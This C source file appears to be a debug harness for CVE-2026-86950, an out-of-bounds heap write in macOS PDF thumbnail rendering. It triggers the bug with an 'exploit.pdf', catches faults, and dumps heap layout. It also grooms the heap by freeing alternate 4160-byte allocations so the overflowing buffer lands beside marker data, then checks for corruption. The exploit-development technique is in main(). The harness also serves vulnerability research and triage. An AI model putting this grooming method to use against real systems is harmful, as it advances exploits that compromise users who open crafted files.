// CVE-2026-86950 debug harness with heap instrumentation.
// Builds on render.c but adds:
//   - MallocGuardEdges to detect OOB writes precisely
//   - MallocScribble to fill freed memory with 0x55
//   - Heap zone introspection to dump allocation layout
//   - Signal handler to catch SIGBUS/SIGSEGV with fault address
//
// Usage:
//   MallocGuardEdges=1 MallocScribble=1 ./render_debug exploit.pdf
//
// Or with Guard Malloc (slower but catches every OOB byte):
//   DYLD_INSERT_LIBRARIES=/usr/lib/libgmalloc.dylib ./render_debug exploit.pdf

#include <ImageIO/ImageIO.h>
#include <CoreGraphics/CoreGraphics.h>
#include <malloc/malloc.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <execinfo.h>

static void fault_handler(int sig, siginfo_t *info, void *ctx) {
    fprintf(stderr, "\n=== FAULT CAUGHT ===\n");
    fprintf(stderr, "Signal: %s (%d)\n",
            sig == SIGSEGV ? "SIGSEGV" : sig == SIGBUS ? "SIGBUS" : "SIGABRT", sig);
    if (info->si_addr) {
        fprintf(stderr, "Fault address: %p\n", info->si_addr);
    }

    void *bt[32];
    int n = backtrace(bt, 32);
    fprintf(stderr, "\nBacktrace (%d frames):\n", n);
    backtrace_symbols_fd(bt, n, 2);

    fprintf(stderr, "\n=== OOB WRITE DETECTED ===\n");
    fprintf(stderr, "The fault address above is where the coverage buffer\n");
    fprintf(stderr, "OOB write attempted to access. With MallocGuardEdges,\n");
    fprintf(stderr, "this is a guard page at the end of the allocation.\n");
    fprintf(stderr, "Offset from allocation = fault_addr - allocation_base.\n");

    _exit(42);
}

static void dump_heap_zone_info(void) {
    malloc_zone_t *zone = malloc_default_zone();
    fprintf(stderr, "\n=== Heap Zone Info ===\n");
    fprintf(stderr, "Default zone: %s at %p\n",
            malloc_get_zone_name(zone), (void *)zone);

    malloc_statistics_t stats;
    malloc_zone_statistics(zone, &stats);
    fprintf(stderr, "  blocks_in_use: %u\n", stats.blocks_in_use);
    fprintf(stderr, "  size_in_use:   %zu bytes\n", stats.size_in_use);
    fprintf(stderr, "  max_size_in_use: %zu bytes\n", stats.max_size_in_use);
    fprintf(stderr, "  size_allocated: %zu bytes\n", stats.size_allocated);
}

static void dump_allocation_info(void *ptr, const char *label) {
    if (!ptr) return;
    size_t sz = malloc_size(ptr);
    malloc_zone_t *zone = malloc_zone_from_ptr(ptr);
    fprintf(stderr, "  %s: ptr=%p size=%zu zone=%s\n",
            label, ptr, sz, zone ? malloc_get_zone_name(zone) : "?");
}

int main(int argc, char **argv) {
    const char *path = argc > 1 ? argv[1] : "exploit.pdf";

    // Install signal handlers for OOB detection
    struct sigaction sa = {0};
    sa.sa_sigaction = fault_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);

    fprintf(stderr, "=== CVE-2026-86950 Debug Harness ===\n");
    fprintf(stderr, "PDF: %s\n", path);
    fprintf(stderr, "MallocGuardEdges: %s\n",
            getenv("MallocGuardEdges") ? "YES" : "NO");
    fprintf(stderr, "MallocScribble: %s\n",
            getenv("MallocScribble") ? "YES" : "NO");
    fprintf(stderr, "Guard Malloc: %s\n",
            getenv("DYLD_INSERT_LIBRARIES") ? "YES" : "NO");

    dump_heap_zone_info();

    // Make some marker allocations to understand heap layout
    fprintf(stderr, "\n=== Marker Allocations (4160 bytes = target size class) ===\n");
    void *markers[8];
    for (int i = 0; i < 8; i++) {
        markers[i] = malloc(4160);
        memset(markers[i], 0x41 + i, 4160);  // fill with identifiable pattern
        dump_allocation_info(markers[i], "marker");
    }
    // Free alternate ones to create holes
    for (int i = 0; i < 8; i += 2) {
        free(markers[i]);
        markers[i] = NULL;
    }
    fprintf(stderr, "(freed markers 0, 2, 4, 6 — coverage buffer may land in one)\n");

    // Now trigger the PDF rendering
    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        NULL, (const UInt8 *)path, strlen(path), false);
    CGImageSourceRef src = CGImageSourceCreateWithURL(url, NULL);
    CFRelease(url);
    if (!src) {
        fprintf(stderr, "CGImageSourceCreateWithURL failed\n");
        return 1;
    }

    int sz = 256;
    CFStringRef k[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                        kCGImageSourceThumbnailMaxPixelSize };
    CFTypeRef   v[] = { kCFBooleanTrue,
                        CFNumberCreate(NULL, kCFNumberIntType, &sz) };
    CFDictionaryRef opts = CFDictionaryCreate(NULL, (const void **)k,
        (const void **)v, 2, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);

    fprintf(stderr, "\n=== Triggering thumbnail render ===\n");
    CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);

    if (img) {
        size_t w = CGImageGetWidth(img);
        size_t h = CGImageGetHeight(img);
        size_t bpr = CGImageGetBytesPerRow(img);
        fprintf(stderr, "\nThumbnail created: %zux%zu, %zu bytes/row\n", w, h, bpr);

        // Extract pixel data to check for corruption artifacts
        CGDataProviderRef dp = CGImageGetDataProvider(img);
        CFDataRef data = CGDataProviderCopyData(dp);
        if (data) {
            const UInt8 *pixels = CFDataGetBytePtr(data);
            CFIndex len = CFDataGetLength(data);
            fprintf(stderr, "Pixel data: %p, %ld bytes\n", pixels, (long)len);

            // Check for our marker pattern in the pixel data
            // (would indicate the OOB write corrupted adjacent allocations)
            int marker_found = 0;
            for (CFIndex i = 0; i < len - 4; i++) {
                if (pixels[i] == 0xCA && pixels[i+1] == 0xFE &&
                    pixels[i+2] == 0xBA && pixels[i+3] == 0xBE) {
                    fprintf(stderr, "MARKER FOUND in pixel data at offset %ld!\n", (long)i);
                    marker_found = 1;
                }
            }
            if (!marker_found) {
                fprintf(stderr, "No marker pattern found in pixel data.\n");
            }

            CFRelease(data);
        }
        CGImageRelease(img);
    } else {
        fprintf(stderr, "\nThumbnail creation returned NULL (rendering failed)\n");
    }

    // Check if our remaining markers were corrupted
    fprintf(stderr, "\n=== Checking marker integrity ===\n");
    for (int i = 1; i < 8; i += 2) {
        unsigned char *p = (unsigned char *)markers[i];
        unsigned char expected = 0x41 + i;
        int corrupted = 0;
        for (int j = 0; j < 4160; j++) {
            if (p[j] != expected) {
                fprintf(stderr, "CORRUPTION in marker %d at offset %d: "
                        "expected 0x%02x, got 0x%02x\n",
                        i, j, expected, p[j]);
                corrupted = 1;
                break;
            }
        }
        if (!corrupted) {
            fprintf(stderr, "  marker %d: intact\n", i);
        }
        free(markers[i]);
    }

    dump_heap_zone_info();
    fprintf(stderr, "\n=== Done (exit=0) ===\n");
    return 0;
}
